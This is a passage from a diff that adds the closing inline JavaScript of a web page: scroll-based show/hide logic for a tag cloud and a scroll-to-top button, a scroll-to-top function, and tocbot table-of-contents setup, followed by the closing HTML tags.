+      document.getElementById("tag-cloud").style.opacity = "1";
+    } else {
+      document.getElementById("tag-cloud").style.visibility = "hidden";
+      document.getElementById("tag-cloud").style.opacity = "0";
+    }
+  }
+  
+
+  
+  if (document.body.scrollTop > 1000 || document.documentElement.scrollTop > 1000) {
+      document.getElementById("scroll-to-top").style.display = "inline";
+      document.getElementById("scroll-to-top").style.visibility = "visible";
+      document.getElementById("scroll-to-top").style.opacity = "1";
+  } else {
+      document.getElementById("scroll-to-top").style.visibility = "hidden";
+      document.getElementById("scroll-to-top").style.opacity = "0";
+  }
+  
+  prevScrollpos = currentScrollPos;
+}
+
+
+function topFunction() {
+  document.body.scrollTop = 0; 
+  document.documentElement.scrollTop = 0; 
+}
+
+
+
+
+
+
+if (document.getElementById("contents-list") !== null && document.getElementsByClassName("post-content").length !== 0) { 
+  tocbot.init({
+    
+    tocSelector: '#contents-list',
+    
+    contentSelector: '.post-content',
+    
+    headingSelector: 'h1, h2, h3',
+  });
+}
+
+
+</script>
+
+
+
+
+</body>
+</html>
